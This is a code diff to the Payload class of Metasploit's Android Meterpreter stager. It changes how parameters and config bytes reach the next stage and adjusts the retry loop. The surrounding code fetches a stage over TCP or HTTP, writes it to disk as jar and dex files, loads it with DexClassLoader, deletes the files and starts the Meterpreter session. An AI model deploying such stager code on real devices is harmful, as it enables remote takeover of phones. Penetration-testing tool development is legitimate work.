@@ -15,8 +15,6 @@ import java.net.URL;
 import java.net.URLConnection;
 import java.util.concurrent.TimeUnit;
 
-import com.metasploit.stage.PayloadTrustManager;
-import com.metasploit.stage.ConfigParser;
 import dalvik.system.DexClassLoader;
 
 public class Payload {
@@ -33,7 +31,7 @@ public class Payload {
     public static long retry_wait;
     public static byte[] cert_hash;
 
-    private static String[] parameters;
+    private static Object[] parameters;
 
     public static void start(Context context) {
         startInPath(context.getFilesDir().toString());
@@ -50,7 +48,7 @@ public class Payload {
     }
 
     public static void startInPath(String path) {
-        parameters = new String[]{ path };
+        parameters = new Object[]{ path , configBytes };
         startAsync();
     }
 
@@ -58,7 +56,7 @@ public class Payload {
         if (args != null) {
             File currentDir = new File(".");
             String path = currentDir.getAbsolutePath();
-            parameters = new String[]{ path };
+            parameters = new Object[]{ path , configBytes };
         }
         long sessionExpiry;
         long commTimeout;
@@ -96,8 +94,8 @@ public class Payload {
         retry_total = TimeUnit.SECONDS.toMillis(retryTotal);
         retry_wait = TimeUnit.SECONDS.toMillis(retryWait);
 
-        while (currentTime < payloadStart + retry_total &&
-            currentTime < session_expiry) {
+        while (currentTime <= payloadStart + retry_total &&
+            currentTime <= session_expiry) {
             try {
                 if (url.startsWith("tcp")) {
                     runStagefromTCP(url);
@@ -156,15 +154,15 @@ public class Payload {
         }
     }
 
-    private static void runNextStage(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
+    private static void runNextStage(DataInputStream in, OutputStream out, Object[] parameters) throws Exception {
         try {
             Class<?> existingClass = Payload.class.getClassLoader().
                     loadClass("com.metasploit.meterpreter.AndroidMeterpreter");
             existingClass.getConstructor(new Class[]{
-                    DataInputStream.class, OutputStream.class, String[].class, boolean.class
+                    DataInputStream.class, OutputStream.class, Object[].class, boolean.class
             }).newInstance(in, out, parameters, false);
         } catch (ClassNotFoundException e) {
-            String path = parameters[0];
+            String path = (String) parameters[0];
             String filePath = path + File.separatorChar + "payload.jar";
             String dexPath = path + File.separatorChar + "payload.dex";
 
@@ -196,7 +194,7 @@ public class Payload {
             file.delete();
             new File(dexPath).delete();
             myClass.getMethod("start",
-                    new Class[]{DataInputStream.class, OutputStream.class, String[].class})
+                    new Class[]{DataInputStream.class, OutputStream.class, Object[].class})
                     .invoke(stage, in, out, parameters);
         }
 
